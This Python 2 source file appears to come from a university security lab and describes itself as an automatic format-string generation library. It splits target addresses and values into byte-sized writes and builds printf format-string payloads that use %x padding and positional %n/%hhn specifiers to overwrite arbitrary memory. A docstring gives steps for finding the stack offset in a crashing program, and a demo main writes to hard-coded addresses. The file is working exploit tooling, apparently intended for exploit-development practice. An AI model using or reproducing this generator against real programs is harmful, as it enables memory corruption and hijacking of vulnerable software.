#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = "Yan Somethingrussian <yans@yancomm.net>"
__version__ = "0.1.0"
__description__ = "An automatic format string generation library."

""" Finding the character offset:
	1. Run the program
	2. Provide the format string, e.g., "FORMATSTRING%n%n%n%n" as input
	3. Continue/Run it (and hope that it crashes, or try again)
	4. Add a breakpoint to the function it crashes on (after the function prologue)
	5. Find the character offset (the pointer to the format string is on the stack,
	   close ot $esp; just calculate the difference)
"""

import operator
import struct
import sys

def chunk(writes, word_size=4, chunk_size=1):
	""" Splits a bunch of writes into different chunks

		Note: I *think* it's little-endian specific
		
		Parameters:
		writes: a list of (target, value) locations (of size word_size) to overwrite
		word_size: the word size (in bytes) of the architecture (default: 4)
		chunk_size: the size (in bytes) of the desired write chunks (default: 1)
	"""
	byte_writes = []
	offsets = range(8 * word_size, -1, -8 * chunk_size)[1:]
	mask_piece = int("FF" * chunk_size, 16)

	for target, value in writes:
		for offset in offsets:
			# Masking and shifting; int is necessary to prevent longs
			mask = mask_piece << offset
			masked = int((value & mask) >> offset) 
			byte_writes.append((target + offset/8, masked, chunk_size))

	return sorted(byte_writes, key=operator.itemgetter(1))


def pad(byte_offset, word_size=4):
	""" Pads the format string
		
		Parameters:
		byte_offset: the number of bytes to padd the string
		word_size: the word size (in bytes) of the architecture (default: 4)
	"""
	word_offset = byte_offset / word_size 
	format_string = "A" * (-byte_offset % word_size)

	# The format_string was padded
	if format_string:
		word_offset += 1

	return format_string, word_offset


def format_string(writes, byte_offset, string_size, current_length, debug=False):
	""" Builds the whole format string

		Parameters:
		writes: a list of (target, value, size_in_bytes) tuples to overwrite
		byte_offset: the offset in bytes on the stack to the format string
		string_size: the size of the format string to generate
		current_length: the length of the format string prefix (if there is one)
		debug: Debug mode (default: False)
	"""
	format_start, word_offset = pad(byte_offset)
	format_start += "".join(struct.pack("=I", t) for t, _, _ in writes)
	format_end = ""

	current_length += len(format_start)

	modifiers = { 1: "hh", 2: "h", 4: "", 8: "ll" }
	for _, v, s in writes:
		next_length = (v - current_length) % (256 ** s)
		
		# For 4 and less characters, printing directly is more efficient
		# For 5 to 8, the general method can't be used
		# Otherwise, use general method
		if next_length < 5:
			format_end += "A" * next_length 
		elif next_length < 8:
			format_end += "%{:d}hhx".format(next_length)
		else:
			format_end += "%{:d}x".format(next_length)
		current_length += next_length

		# TODO: Remove this ugly debug shit
		if not debug:
			format_end += "%{:d}${:s}n".format(word_offset, modifiers[s])
		else:
			format_end += "\n%{:d}$08x\n".format(word_offset)
		word_offset += 1

	# Pad and return the built format string
	format_string = format_start + format_end
	return format_string + "B" * (string_size - len(format_string))

def formatstring_fuckyeah(writes, byte_offset, string_size, printed_count, debug=False):
	print 'FuckYeah mode: ON'
	return format_string(writes, byte_offset, string_size, printed_count, debug)

def main():
	writes = ((0x45397010, 0x01020304),\
			  (0x45397014, 0x11121314))
	chunks = chunk(writes, 4, 2)[0:1] + chunk(writes, 4, 1)[2:]
	print format_string(chunks, int(sys.argv[1]), 1024, 0, debug=("t" == sys.argv[2]))


def usage():
	print >> sys.stderr, "ze seclab's über format string !"
	print >> sys.stderr, " Usage: {} <offset> <t|f>".format(sys.argv[0])
	sys.exit(1)


if __name__ == "__main__":
	if len(sys.argv) != 3:
		usage()
	main()
